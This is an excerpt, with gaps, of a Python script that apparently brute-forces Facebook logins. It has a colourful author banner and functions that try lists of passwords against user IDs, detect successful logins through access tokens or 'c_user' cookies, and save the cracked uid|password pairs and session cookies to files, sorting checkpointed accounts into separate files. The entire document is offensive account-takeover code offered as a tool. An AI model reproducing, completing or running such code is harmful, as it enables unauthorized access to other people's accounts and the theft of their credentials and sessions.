...
\33[93m║       #TOOL AUTHOR \x1b[0;32m[JOSH] \x1b[0;36mFAMOUS KING\33[93m    ║
\33[93m╚══════════════════════════════════════════╝
\x1b[0;32m -------------------------------------------
\x1b[0;34m╔══════════════════════════════════════════╗
\x1b[0;34m║#BEST FRIEND  :\x1b[0;31mJOSH /UNTAG KING  \x1b[0;34m       ║
\x1b[0;34m║#FACEBOOK NAME:\x1b[0;31m[JOSH AHM]       \x1b[0;34m       ║
\x1b[0;34m║#GITHUB       :\x1b[0;31mJOSH-AHM         \x1b[0;34m      ║
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\x1b[0;34m[JOSH-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\x1b[0;32m[MARK-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\x1b[0;34m[MARK-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\x1b[0;32m[JOSH-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[JOSH-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\x1b[0;32m[JOSH-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[JOSH-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
